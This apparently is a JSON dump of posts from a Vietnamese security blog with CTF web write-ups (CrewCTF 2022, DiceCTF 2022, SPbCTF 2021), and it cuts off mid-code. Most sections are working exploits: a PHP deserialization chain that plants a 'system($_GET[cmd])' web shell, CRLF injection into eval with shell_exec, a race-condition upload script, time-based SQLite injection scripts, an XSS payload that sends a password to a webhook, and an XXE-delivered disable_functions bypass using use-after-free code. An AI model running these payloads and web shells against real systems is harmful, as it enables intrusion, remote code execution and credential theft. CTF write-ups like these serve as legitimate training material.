&#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;, &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;, ]); foreach ($contents as $path =&amp;gt; $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this-&amp;gt;cleanContents($this-&amp;gt;cache); return json_encode([$cleaned, $this-&amp;gt;complete]); } public function save() { $contents = $this-&amp;gt;getForStorage(); $this-&amp;gt;store-&amp;gt;set($this-&amp;gt;key, $contents, $this-&amp;gt;expire); } public function __destruct() { if (!$this-&amp;gt;autosave) { $this-&amp;gt;save(); } }}class B { protected function getExpireTime($expire): int { return (int) $expire; } public function getCacheKey(string $name): string { return $this-&amp;gt;options[&#39;prefix&#39;] . $name; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&amp;gt;options[&#39;serialize&#39;]; return $serialize($data); } public function set($name, $value, $expire = null): bool{ $this-&amp;gt;writeTimes++; if (is_null($expire)) { $expire = $this-&amp;gt;options[&#39;expire&#39;]; } $expire = $this-&amp;gt;getExpireTime($expire); $filename = $this-&amp;gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // Failed to create } } $data = $this-&amp;gt;serialize($value); if ($this-&amp;gt;options[&#39;data_compress&#39;] &amp;amp;&amp;amp; function_exists(&#39;gzcompress&#39;)) { // data compression $data = gzcompress($data, 3); } $data = &quot;&amp;lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&amp;gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) { return true; } return false; }}if (isset($_GET[&#39;src&#39;])){ highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){ mkdir($dir);}unserialize($_GET[&quot;data&quot;]);Phân tíchThoạt nhìn vào đoạn code này thì mình phát hiện một thứ khá thú vị file_put_contents xuất hiện ở class B trong hàm set(), hàm này thực hiện việc ghi $data vào $filename =&amp;gt; có thể tận dụng để ghi một php shell trên server 😋. Ta sẽ cùng truy ngược lại các giá trị liên quan tới chúng. filename: được gán bằng $this-&amp;gt;getCacheKey($name) với $name là tham số truyền vào và được prepend với một giá trị trong options[&#39;prefix&#39;] của class. public function getCacheKey(string $name): string { return $this-&amp;gt;options[&#39;prefix&#39;] . $name; } data: được gán bằng $this-&amp;gt;serialize($value) với $value là tham số truyền vào và $serialize lấy từ một giá trị trong options[&#39;serialize&#39;] của class. protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&amp;gt;options[&#39;serialize&#39;]; return $serialize($data); } expire: được gán bằng $this-&amp;gt;getExpireTime($expire); với $expire là tham số truyền vào protected function getExpireTime($expire): int { return (int) $expire; } Nhưng ở đây nảy sinh ra một vấn đề 🤔, vì $data = &quot;&amp;lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&amp;gt;\\n&quot; . $data; $data truyền vào mặc dù là một “User-Controllable Input” nhưng bởi vì được append vào cuối chuỗi nên khi thực thi shell thì sẽ thoát do exit(). Đây là một bài post hay về các cách bypass hàm nàyvà mình sẽ làm theo cách base64 decode.Đến đây ta biết được last gadget sẽ là method set() của class B vậy class A sẽ làm nhiệm vụ chain tới B. Nhìn lại source thì mình phát hiện được magic method __destruct gọi tới save() ở trong save() gọi $this-&amp;gt;store-&amp;gt;set($this-&amp;gt;key, $contents, $this-&amp;gt;expire); =&amp;gt; cần gán store = new class B(). Và $key, $content, $expire sẽ ứng với $name, $value, $expire key = “shell.php” expire gán đại bằng “bla”. content được gán bằng return value của $this-&amp;gt;getForStorage();, mình sẽ contruct sao cho getForStorage() trả về [[],&quot;PD9jdWMgY3VjdmFzYigpOz8+&quot;] $cache = array(); $complete = base64_encode(&quot;xxx&quot;.base64_encode(&#39;&amp;lt;?php system($_GET[\\&#39;cmd\\&#39;])?&amp;gt;&#39;)); ở đây cần thêm vào trước 3 kí tự bởi vì &amp;lt;?php\\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\\n exit();?&amp;gt;\\n sẽ biến thành php//000000000000exit khi dùng php wrapper -&amp;gt; length = 21, mà một nhóm chứa 4 kí tự base64 sẽ được decode thành 3 bytes nên ta phải thêm 3 bytes xxx vào trước để tránh làm “hỏng” web shell. Sau cùng $value=&quot;W1tdLCJQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXeWRqYldRblhTa1wvUGc9PSJd&quot; nên ở đoạn code $data = $this-&amp;gt;serialize($value); cần base64 decode trở lại và $data sẽ bằng [[],&quot;PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk\\/Pg==&quot;] -&amp;gt; $this-&amp;gt;options[&#39;serialize&#39;] = &quot;base64_decode&quot;. Lần decode cuối cùng là lúc ghi vào file shell.php dùng php wrapper và lưu ý các kí tự không hợp lệ sẽ bị bỏ qua.Cuối cùng để ghi thành công một php shell lên server chỉ cần set $this-&amp;gt;options[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=&#39; 🤗Khai thácKết quả:result flag{94d92ddd-e935-46d4-93ef-f4fb272bd81c}Tài liệu tham khảohttps://websec.files.wordpress.com/2010/11/rips_ccs.pdfhttps://vickieli.dev/insecure%20deserialization/pop-chains/https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list" }, { "title": "CrewCTF 2022", "url": "/posts/crewctf2022/", "categories": "WebSec, CTF", "tags": "sqli, timing attack, rce, race condition", "date": "2022-04-17 19:57:00 +0700", "snippet": "Ở post mình sẽ viết writeup cho 4/7 bài web của giải crewctf2022 mà mình giải được.1. CuaaSBài này chỉ đơn giản là đọc và hiểu được cách hoạt động của trang web thì sẽ giải ra.Link challengehttp://193.105.207.19:5001/Source codeDownloadOverviewoverviewPhân tíchĐề cho chúng ta hai file index.php, cleaner.php và php.ini - một file để cấu hình php web serverindex.php:&amp;lt;?phpif($_SERVER[&#39;REQUEST_METHOD&#39;] == &quot;POST&quot; and isset($_POST[&#39;url&#39;])) { clean_and_send($_POST[&#39;url&#39;]); } function clean_and_send($url){ $uncleanedURL = $url; // should be not used anymore $values = parse_url($url); $host = explode(&#39;/&#39;,$values[&#39;host&#39;]); $query = $host[0]; $data = array(&#39;host&#39;=&amp;gt;$query); $cleanerurl = &quot;http://127.0.0.1/cleaner.php&quot;; $stream = file_get_contents($cleanerurl, true, stream_context_create([&#39;http&#39; =&amp;gt; [ &#39;method&#39; =&amp;gt; &#39;POST&#39;, &#39;header&#39; =&amp;gt; &quot;X-Original-URL: $uncleanedURL&quot;, &#39;content&#39; =&amp;gt; http_build_query($data) ] ])); echo $stream; }?&amp;gt;Chức năng: nhận biến url từ method POST sau đó đưa vào hàm clean_and_send để xử lí. Hai dòng code đáng chú ý là $uncleanedURL = $url; và &#39;header&#39; =&amp;gt; &quot;X-Original-URL: $uncleanedURL&quot;, biến url gửi lên server được đưa trực tiếp vào header option của stream_context_create và context này dùng làm tham số thứ 3 cho file_get_contents với filename là http://127.0.0.1/cleaner.php -&amp;gt; có thể hiểu là gửi POST request tới http://127.0.0.1/cleaner.php dựa trên context.cleaner.php:&amp;lt;?phpif ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;){die(&quot;&amp;lt;img src=&#39;https://imgur.com/x7BCUsr.png&#39;&amp;gt;&quot;);}echo &quot;&amp;lt;br&amp;gt;There your cleaned url: &quot;.$_POST[&#39;host&#39;];echo &quot;&amp;lt;br&amp;gt;Thank you For Using our Service!&quot;;function tryandeval($value){ echo &quot;&amp;lt;br&amp;gt;How many you visited us &quot;; eval($value); }foreach (getallheaders() as $name =&amp;gt; $value) { if ($name == &quot;X-Visited-Before&quot;){ tryandeval($value); }}?&amp;gt;File sẽ check xem nếu tồn tại header X-Visited-Before thì gọi hàm tryandeval() -&amp;gt; eval() được thực thi. Vì vậy mục tiêu của mình sẽ làm sao cho xuất hiện được header này và RCE tìm flag.Quay lại đọc docs của stream_context_create mình tìm ra được cách để truyền nhiều headerFile php.ini mà bài cung cấp disable 1 vài functions:disable_functions = proc_open, popen, disk_free_space, diskfreespace, set_time_limit, leak, tmpfile, exec, system, passthru, show_source, system, phpinfo, pcntl_alarm, pcntl_fork, pcntl_waitpid, pcntl_wait, pcntl_wifexited, pcntl_wifstopped, pcntl_wifsignaled, pcntl_wexitstatus, pcntl_wtermsig, pcntl_wstopsig, pcntl_signal, pcntl_signal_dispatch, pcntl_get_last_error, pcntl_strerror, pcntl_sigprocmask, pcntl_sigwaitinfo, pcntl_sigtimedwait, pcntl_exec, pcntl_getpriority, pcntl_setpriorityNhưng vẫn “chừa” lại 1 vài hàm chẳng hạn như shell_exec có thể dùng được.Khai thác $url = &quot;http://example.com\\r\\nX-Visited-Before: echo shell_exec(&#39;cat /maybethisistheflag&#39;);&quot;; echo urlencode($url); Kết quả:response crew{crlF_aNd_R357r1C73D_Rc3_12_B0R1nG}2. UploadzBài này thuộc dạng “race condition with file upload”, các bạn chưa quen với race condition thì có thể đọc sơ qua bài viết nàyLink challengehttps://uploadz-web.crewctf-2022.crewc.tf/Source codeDownloadOverviewoverviewPhân tíchBài cho các file: index.php, .htaccess, my-apache2.conf và một vài file khác để dựng local.index.php:&amp;lt;?php function create_temp_file($temp,$name){ $file_temp = &quot;storage/app/temp/&quot;.$name; copy($temp,$file_temp); return $file_temp; } function gen_uuid($length=6) { $keys = array_merge(range(&#39;a&#39;, &#39;z&#39;), range(&#39;A&#39;, &#39;Z&#39;)); for($i=0; $i &amp;lt; $length; $i++) { $key .= $keys[array_rand($keys)]; } return $key;} function move_upload($source,$des){ $name = gen_uuid(); $des = &quot;storage/app/uploads/&quot;.$name.$des; copy($source,$des); sleep(1);// for loadblance and anti brute unlink($source); return $des; } if (isset($_FILES[&#39;uploadedFile&#39;])) { // get details of the uploaded file $fileTmpPath = $_FILES[&#39;uploadedFile&#39;][&#39;tmp_name&#39;]; $fileName = basename($_FILES[&#39;uploadedFile&#39;][&#39;name&#39;]); $fileNameCmps = explode(&quot;.&quot;, $fileName); $fileExtension = strtolower(end($fileNameCmps)); $dest_path = $uploadFileDir . $newFileName; $file_temp = create_temp_file($fileTmpPath, $fileName); echo &quot;your file in &quot;.move_upload($file_temp,$fileName); } if(isset($_GET[&quot;clear_cache&quot;])){ system(&quot;rm -r storage/app/uploads/*&quot;); }?&amp;gt;Khi một file được upload lên server thì sẽ được xử lí như sau: Copy file từ vị trí mặc định (được config trong php khi upload lên server) đến đường dẫn storage/app/temp/ với tên là tên của file upload (tạm gọi file này là file copy). Di chuyển file copy vừa được tạo đến storage/app/uploads/, tên file sẽ được thêm vào trước một random string. Sau 1s, tiến hành xóa file copy.Dockerfile:RUN chmod 777 /var/www/html/storage/app/temp/RUN chmod 777 /var/www/html/storage/app/uploads/RUN chmod 555 /var/www/html/index.phpRUN chmod 555 /var/www/html/.htaccessTừ file docker này mình thấy được index.php, .htaccess ở thư mục /var/www/html/ chỉ có quyền read và execute. Trong khi ở 2 thư mục temp và uploads thì có full permission.my-apache2.conf:&amp;lt;Directory /var/www/html&amp;gt; Options Indexes FollowSymLinks AllowOverride All Require all granted&amp;lt;/Directory&amp;gt;Đoạn code cấu hình này có nghĩa là nếu có 1 request nào đó yêu cầu 1 file/thư mục thuộc /var/www/html hoặc subfolder của /var/www/html thì server sẽ tìm các file .htaccess trong /var/www/html hoặc subfolder tùy thuộc vào vị trí file được request sau đó dùng nó để overwrite các settings của Apache. Các bạn có thể xem 1 ví dụ tại đây..htaccess: RewriteCond %{REQUEST_FILENAME} -f RewriteCond %{REQUEST_FILENAME} !/storage/app/temp/.* RewriteCond %{REQUEST_FILENAME} !/storage/app/uploads/.* RewriteRule !^index.php index.php [L,NC] RewriteCond %{REQUEST_FILENAME} -f RewriteCond %{REQUEST_FILENAME} \\.php$ RewriteRule !^index.php index.php [L,NC] RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^ index.php [L]File setting này sẽ thực hiện việc check như sau: 4 dòng đầu: nếu requested file không tồn tại trong /storage/app/temp/ hoặc /storage/app/uploads/ thì redirect đến index.php 3 dòng tiếp: nếu requested file kết thúc bằng .php thì redirect đến index.php 2 dòng cuối: nếu requested file không tồn tại thì redirect đến index.phpCác hướng thử tiếp cận: Upload 1 file php sau đó access tới storage/app/uploads/&amp;lt;filename&amp;gt;.php để thực thi code -&amp;gt; như đã nói ở trên cách này sẽ không khả thi vì không thỏa điều kiện thứ hai đã đề cập. Thử overwrite file .htaccess ở /var/www/html/ bằng path traversal để tự config lại -&amp;gt; cách này cũng không khả thi vì sẽ có một random string thêm vào trước tên file và ta không có quyền write ở thư mục này.Sau 1 hồi đọc lại source thì mình mới nhận ra dụng ý của tác giả. Tại sao ta không move trực tiếp file upload từ vị trí mặc định được cấu hình trong php (ở /tmp) đến storage/app/uploads/ mà phải tạo thêm storage/app/temp/ ?. Một điểm đáng chú ý nữa là server sẽ sleep(1) sau khi copy($source,$des); rồi mới unlink($source); -&amp;gt; race conditionCụ thể hơn cách khai thác của mình như sau: file exp.php3 chứa đoạn code để RCE. file .htaccess sẽ cấu hình để tất cả các file .php3 thực thi được php code. Dùng 3 thread: thread 1 và 2 dùng để upload đồng thời hai file exp.php3 và .htaccess -&amp;gt; 2 file này sẽ được copy đến storage/app/temp/, thread còn lại sẽ access tới storage/app/temp/exp.php3 để lấy response.Khai thác.htaccess:AddType application/x-httpd-php .php3exp.php3&amp;lt;?php phpinfo(); ?&amp;gt;exploit.py:pyimport osfrom threading import Threadimport requestsNumberofThreads = 10TARGET = &quot;https://uploadz-web.crewctf-2022.crewc.tf/&quot;def upload_htaccess(): r = requests.post(TARGET, files = {&quot;uploadedFile&quot;: open(&quot;.htaccess&quot;, &quot;r&quot;)}) def upload_php3(): r = requests.post(TARGET, files = {&quot;uploadedFile&quot;: open(&quot;exp.php3&quot;, &quot;r&quot;)})def get_request(): r = requests.get(TARGET + &quot;storage/app/temp/exp.php3&quot;) f = open(&quot;phpinfo.html&quot;, &quot;w&quot;) f.write(r.text) #print(r.text)for i in range(NumberofThreads): t1 = Thread(target=upload_htaccess) t2 = Thread(target=upload_php3) t3 = Thread(target=get_request) t1.start() t2.start() t3.start()Đầu tiên cần thông tin về các disable_functions nên sẽ dùng phpinfo();phpinfoSau đó chỉnh lại file exp.php3&amp;lt;?php system(&quot;cat /flag.txt&quot;); ?&amp;gt;result crewctf{upload_rce_via_race}3. Marvel PickBài này là một dạng sqlite injectionLink challengehttp://104.155.50.189:1337/OverviewoverviewPhân tíchCtrl + U -&amp;gt; để view source trang web.&amp;lt;script&amp;gt; const marvel = [ &#39;spiderman&#39;, &#39;ironman&#39;, &#39;captainamerica&#39;, &#39;nickfury&#39; ] function fetchMarvelVotesCount (marvel) { fetch(`/api.php?character=${marvel}`) .then(response =&amp;gt; response.json()) .then(results =&amp;gt; { const vote_count_html = document.querySelector(`#vote-count-${marvel}`) const total_vote = results.data.vote_count if (total_vote &amp;gt; 1) { vote_count_html.innerHTML = `${total_vote} Votes` } else { vote_count_html.innerHTML = `${total_vote} Vote` } }) } function vote (marvel) { const formData = new FormData() formData.append(&#39;character&#39;, marvel) fetch(&#39;/api.php&#39;, { method: &#39;POST&#39;, body: formData }) .then(response =&amp;gt; response.json()) .then(result =&amp;gt; { if (result.success) { fetchMarvelVotesCount(marvel) alert(&#39;successful voting&#39;) } else { alert(result.error) } }) .catch(error =&amp;gt; { alert(&#39;error&#39;); }); } marvel.forEach(item =&amp;gt; { fetchMarvelVotesCount(item) })&amp;lt;/script&amp;gt;Khi ấn Vote sẽ có 2 request được gửi đi.Sau một hồi fuzz thì mình thấy có lỗi sqli ở parameter charactersql errorBên cạnh đó các kí tự *,-,/,=, và or, select, where đều bị replace thành &quot;&quot;.Tiếp tục thử các payload thì mình nhận ra nếu câu truy vấn thành công thì sẽ trả về name bằng chính giá trị của character.successsql errorvà cũng bằng cách này ta xác định được server dùng sqlite.sqlite detectBài này để giải mình chọn cách khai thác theo time based sqli với hàm RANDOMBLOB() và IIF()Lúc giải mình không viết script để solve từ a-z mà làm từng đoạn nhưng mình vẫn sẽ để payload tích cóp được để tìm table name, column name, … ở bên dưới.Payload cho sqlite injectionTable:# find length?character=&#39;||IIF((SELECT LENGTH(tbl_name) FROM sqlite_master LIMIT {index},1) LIKE {len},1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;#find table name &#39;||IIF((SELECT HEX(SUBSTR(tbl_name,{pos},1)) FROM sqlite_master LIMIT {index},1) LIKE HEX(&#39;{c}&#39;),1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;Column:#find column name &#39;||IIF((SELECT HEX(SUBSTR(name,{pos},1)) FROM pragma_table_info(&#39;&amp;lt;table name goes here&amp;gt;&#39;) LIMIT {index},1) LIKE HEX(&#39;{char}&#39;),1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;Sau một hồi bruteforce để tìm thông tin thì mình tổng kết lại được như sau:Number of table: 2 characters flagsNumber of flags’s column: 2 id valueKhai thácimport requestsfrom time import timefrom string import printableTARGET = &quot;http://104.155.50.189:1337/api.php&quot;def encode_all(string): return &quot;&quot;.join(&quot;%{0:0&amp;gt;2}&quot;.format(format(ord(char), &quot;x&quot;)) for char in string)for i in range(1,34): if(flag.endswith(&#39;}&#39;)): break for c in printable: if c == &#39;\\&#39;&#39;: continue query = f&quot;&#39;||IIF((SELECT HEX(SUBSTR(value,{i},1)) FROM flags) LIKE HEX(&#39;{c}&#39;),1,UPPER(HEX(RANDOMBLOB(99999))))||&#39;&quot; # print(query) query_urlencoded = encode_all(query) start = time() r = requests.get(TARGET + &quot;?character=&quot; +query_urlencoded) end = time() # print(end - start) if(end - start &amp;lt; 0.8): flag += c print(flag) break crew{so_its_n0t_on3_line_for_exp}4. Marvel Pick AgainBài này thì cũng tương tự bài trước chỉ khác là length của character phải &amp;lt;= 75No No NONên việc mình làm là tối ưu lại length của payloadKhai thácimport requestsfrom time import timefrom string import printableTARGET = &quot;http://104.155.50.189:3390/api.php&quot;for i in range(1,41): if(flag.endswith(&#39;}&#39;)): break for c in printable: if c != &#39;\\&#39;&#39; and c != &#39;*&#39; and c != &#39;-&#39; and c != &#39;/&#39; and c!= &#39;;&#39; and c!= &#39;=&#39;: query = f&quot;&#39;||IIF((SELECT SUBSTR(value,{i},1) FROM flags)&amp;lt;&amp;gt;&#39;{c}&#39;,1,RANDOMBLOB(999999))||&#39;&quot; query_urlencoded = encode_all(query) start = time() r = requests.get(TARGET + &quot;?character=&quot; +query_urlencoded) end = time() #print(end - start) if(end - start &amp;gt; 0.8): flag += c print(flag) break crew{y3sss_y0u_g0t_m3_h1_1_st4rn_n_n1n0}" }, { "title": "NoCookies - DiceCTF2022", "url": "/posts/noCookies/", "categories": "WebSec, CTF", "tags": "sqli, xss", "date": "2022-04-08 13:07:00 +0700", "snippet": "Link challengehttps://instancer.mc.ax/no-cookieshttps://admin-bot.mc.ax/no-cookiesSource codeDownloadSơ lược về trang weboverview Sẽ có 2 chức năng: Register -&amp;gt; đăng kí account và create note -&amp;gt; tạo note Hoạt động không dựa trên cookie mà yêu cầu ta nhập lại username, password mỗi lần thực hiện một hành động nào đó.Ở phần Create Note thì ta có 2 tùy chọn là Markdown hoặc là Plain.create note optionPhân tích1. XSS qua markdown optionĐọc qua source code thì thấy phần lớn các trang view.html, register.html đều thuộc dạng client side renderingmarkdown note handerĐiều đáng chú ý ở đoạn code này là nếu note nhập vào có dạng [blabla](test) thì sẽ return thẻ a: &amp;lt;a href = &quot;test&quot;&amp;gt;blabla&amp;lt;/a&amp;gt;Từ đây có thể dễ dàng khai thác XSS: ta dùng 2 thuộc tính autofocus và onfocus để trigger nó&amp;lt;a href =&quot;test&quot; autofocus onfocus= &quot;alert`1&quot;&amp;gt;Điều đáng buồn là khi tạo note:(foo)[http://example.com&quot; autofocus=autofocus onfocus=&quot;alert(password&amp;amp;#x29;](ở đây escape ) trở thành &amp;amp;#x29; để cho regex không làm mất đi ) )Gửi note và ấn view xuất hiện pop-up undefined 😟Quay lại source code thấy rằng const password, được định nghĩa trong một anonymous arrow function và đoạn code được thực thi bên ngoài nó (đến từ HTML event handler)Nhìn lại source, để ý cách validate password:const validate = (text) =&amp;gt; {return /^[^$&#39;]+$/.test(text ?? &#39;&#39;);}Chỉ đơn giản là kiểm tra sao cho phải có tối thiểu 1 kí tự và không tồn tại &#39; hoặc $Mình tìm được một thứ thú vụ về Regex. Đại khái là: RegExp.input hoặc RegExp.$_ sẽ trả về chuỗi match với regular expression.Ví dụ:var re = /hi/g;re.test(&#39;hi there!&#39;);RegExp.input; // &quot;hi there!&quot;re.test(&#39;foo&#39;); // new test, non-matchingRegExp.$_; // &quot;hi there!&quot;re.test(&#39;hi world!&#39;); // new test, matchingRegExp.$_; // &quot;hi world!&quot;Nhưng tất cả những .replace() call từ markdown parsing đã làm thay đổi giá trị của nó (overiding the password) vì vậy không thể khai thác thông qua markdown note -&amp;gt; chỉ còn lại con đường plain note.2. XSS qua plain optiondatabase handler code1database handler code2Ta có thể thấy trước khi chèn vào DB, note bị replace &amp;lt; và &amp;gt; gây khó khăn cho việc khai thác.Nhưng prepare function đã giải quyết vấn đề này, hàm này đơn giản chỉ là replace lần lượt :id, :username, :note, :mode thành các giá trị tương ứng với nó.{id: &quot;12345&quot;,username: &quot;:note&quot;,note: &#39;, :mode, 22, 0)-- &#39;,mode: &#39;&amp;lt;img src=x onerror=&quot;alert(RegExp.input)&quot;&amp;gt;&#39;,}sqli pocKhai thácresponseresultOverwrite “document.querySelector” và “JSON.stringify”ở phần này mình sẽ đề cập tới một cách khai thác khác.Cách này thì vẫn vận dụng sqli như cách trước để chèn xss note vào db nhưng khác ở chỗ xss note sẽ là:&amp;lt;svg&amp;gt;&amp;lt;svg/onload=&quot;document.querySelector=function(){JSON.stringify=a=&amp;gt;fetch(`https://webhook.site/1e6c4248-b312-498b-93c3-073ffc762693?`+a.password),arguments.callee.caller()}&quot;&amp;gt;Code này thực hiện việc rewrite lại hàm document.querySelector và JSON.stringify, sau đó gọi arguments.callee.caller() Line 59 thực hiện gán innerHTML = Plain note của ta đồng thời kích hoạt onload event của svg thực hiện việc ghi đè hàm document.querySelector. Line 60 gọi tới document.querySelector (lúc này là hàm mà ta đã định nghĩa lại): thực hiện ghi đè hàm JSON.stringify và đồng thời gọi tới arguments.callee.caller(). Có thể hiểu arguments.callee là chỉ hàm hiện tại đang thực thi -&amp;gt; document.querySelector và arguments.callee.caller() là hàm gọi tới nó, chính là cái async () bao trọn tất cả code. Hay nói cách khác mục đích của arguments.callee.caller() là để chạy lại đoạn code từ 24 – 62 một lần nữa. Lúc này JSON.stringify nhận vào một object bao gồm password sẽ thực hiện fetch tới web hook của ta và boom flag! dice{curr3nt_st4t3_0f_j4v45cr1pt}Tham khảohttps://blog.bawolff.net/2022/02/write-up-for-dicectf-2022-nocookies.html" }, { "title": "31 Line PHP - SPbCTF2021", "url": "/posts/31linephp/", "categories": "WebSec, CTF", "tags": "xxe, rce", "date": "2022-04-05 23:35:00 +0700", "snippet": "Challenge này từ năm ngoái nhưng mình vẫn muốn viết bởi 1 phần nó khá hay và lí do ngoài lề khác là năm nay mình mới tập tành viết blog 😝Source codesource codePhân tíchNhìn qua source code thì ta sẽ phải POST dữ liệu data=xxxx và một file. Server sẽ check session của ta nếu không có thì sẽ tạo random một sess_id và dùng sess_id này để làm thư mục cha của file upload.2 dòng comment khá thú vị, liên quan đến lỗi XXE của Wordpress 3.9.2. Tiếp tục search thì mình tìm ra một blog về một bug khác cũng của Wordpress liên quan đến XXE. libxml_disable_entity_loader(true) được thêm vào ở đây để config XML parser tắt tính năng load external entity và tính năng này nên được áp dụng với các version PHP &amp;lt; 8, kể từ 8 trở đi thì PHP dùng libxml từ version 2.9.0 (disable XXE bydefault) nên libxml_disable_entity_loader() không được dùng nữa.Từ đó ta có thể thấy không có vấn đề gì ở đoạn code này nhưng loadXML() ở dòng code dưới thì sao?. Bởi vì nó được thực thi với flag LIBXML_NOENT nên sẽ enable entity substitution. Cụ thể hơn là:LIBXML_NOENTVì vậy ta vẫn có thể lợi dụng điều này để áp dụng kĩ thuật XXE 😊Thử upload một file test.xml:test.htmlVới PHPSESSID trong cookie của tapython scriptTa được:responeXXE thành công nhưng sẽ không có cách nào tìm được file flag vì XXE theo cách này chỉ có thể retrieve file từ xa bên phía server 😐 vì vậy mình đã không giải ra.Sau khi đọc wu thì mới phát hiện ra rằng file ta upload lên được xóa ở cuối unlink() sau khi được parse XML. Điều này có nghĩa là nếu ta upload một file PHP và truy cập file đó một lần nữa thông qua XML. Và dùng php://filter để encode base64 thì có thể lấy được output của file php (sau khi thực thi bên phía server) qua response. Để ý một điểm nữa là file upload được lưu tại thư mục var/www/html/upload/$id/$name nên suy đoán thư mục root của web server sẽ là /var/www/html. Suy ra ta có thể access đến file upload bên phía server thông qua đường dẫn http://62.84.114.238/upload/$id/$FILENAME&amp;lt;!DOCTYPE foo [ &amp;lt;!ELEMENT foo ANY &amp;gt;&amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/89e05a8b6e028eeda25a0845b9b3daaa/payload.php&quot; &amp;gt;]&amp;gt;&amp;lt;creds&amp;gt;&amp;lt;user&amp;gt;&amp;amp;xxe;&amp;lt;/user&amp;gt;&amp;lt;pass&amp;gt;&amp;lt;/pass&amp;gt;&amp;lt;/creds&amp;gt;&amp;lt;?php phpinfo(); ?&amp;gt;Ta chỉnh lại file upload với phpinfo(); và để server thực thi được file php thì chỉnh luôn extension thành .phpresponeThành công base64 decode và mở bằng trình duyệt:phpinfo😑 Các function có thể dùng để rce đều bị filter.Nhưng cái disable_functions này có thể bypass được dựa vào bug 0day được published PoC. Tại thời điểm publish, bug này có thể dùng để bypass hầu như mọi PHP versions và khai thác dựa trên memory corruption.Khai thácimport requestsimport reimport base64TARGET = &#39;http://62.84.114.238&#39;while 1: COMMAND = str(input(&#39;$ &#39;)) with open(&#39;payload.php&#39;, &#39;w&#39;) as f: f.write(&quot;&quot;&quot;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/ebb8f496d6241dfd214351614c852de7/payload.php&quot; &amp;gt; ]&amp;gt;&amp;lt;creds&amp;gt; &amp;lt;user&amp;gt;&amp;amp;xxe;&amp;lt;/user&amp;gt; &amp;lt;pass&amp;gt;mypass&amp;lt;/pass&amp;gt;&amp;lt;/creds&amp;gt;&quot;&quot;&quot; + &quot;&quot;&quot;&amp;lt;?php # PHP 7.0-8.0 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=54350# # This exploit should work on all PHP 7.0-8.0 versions# released as of 2021-10-06## Author: https://github.com/mm0r1pwn(&#39;{}&#39;);&quot;&quot;&quot;.format(COMMAND) + r&quot;&quot;&quot;function pwn($cmd) { define(&#39;LOGGING&#39;, false); define(&#39;CHUNK_DATA_SIZE&#39;, 0x60); define(&#39;CHUNK_SIZE&#39;, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE); define(&#39;FILTER_SIZE&#39;, ZEND_DEBUG_BUILD ? 0x70 : 0x50); define(&#39;STRING_SIZE&#39;, CHUNK_DATA_SIZE - 0x18 - 1); define(&#39;CMD&#39;, $cmd); for($i = 0; $i &amp;lt; 10; $i++) { $groom[] = Pwn::alloc(STRING_SIZE); } stream_filter_register(&#39;pwn_filter&#39;, &#39;Pwn&#39;); $fd = fopen(&#39;php://memory&#39;, &#39;w&#39;); stream_filter_append($fd,&#39;pwn_filter&#39;); fwrite($fd, &#39;x&#39;);}class Helper { public $a, $b, $c; }class Pwn extends php_user_filter { private $abc, $abc_addr; private $helper, $helper_addr, $helper_off; private $uafp, $hfp; public function filter($in, $out, &amp;amp;$consumed, $closing) { if($closing) return; stream_bucket_make_writeable($in); $this-&amp;gt;filtername = Pwn::alloc(STRING_SIZE); fclose($this-&amp;gt;stream); $this-&amp;gt;go(); return PSFS_PASS_ON; } private function go() { $this-&amp;gt;abc = &amp;amp;$this-&amp;gt;filtername; $this-&amp;gt;make_uaf_obj(); $this-&amp;gt;helper = new Helper; $this-&amp;gt;helper-&amp;gt;b = function($x) {}; $this-&amp;gt;helper_addr = $this-&amp;gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2; $this-&amp;gt;log(&quot;helper @ 0x%x&quot;, $this-&amp;gt;helper_addr); $this-&amp;gt;abc_addr = $this-&amp;gt;helper_addr - CHUNK_SIZE; $this-&amp;gt;log(&quot;abc @ 0x%x&quot;, $this-&amp;gt;abc_addr); $this-&amp;gt;helper_off = $this-&amp;gt;helper_addr - $this-&amp;gt;abc_addr - 0x18; $helper_handlers = $this-&amp;gt;str2ptr(CHUNK_SIZE); $this-&amp;gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers); $this-&amp;gt;prepare_leaker(); $binary_leak = $this-&amp;gt;read($helper_handlers + 8); $this-&amp;gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak); $this-&amp;gt;prepare_cleanup($binary_leak); $closure_addr = $this-&amp;gt;str2ptr($this-&amp;gt;helper_off + 0x38); $this-&amp;gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr); $closure_ce = $this-&amp;gt;read($closure_addr + 0x10); $this-&amp;gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce); $basic_funcs = $this-&amp;gt;get_basic_funcs($closure_ce); 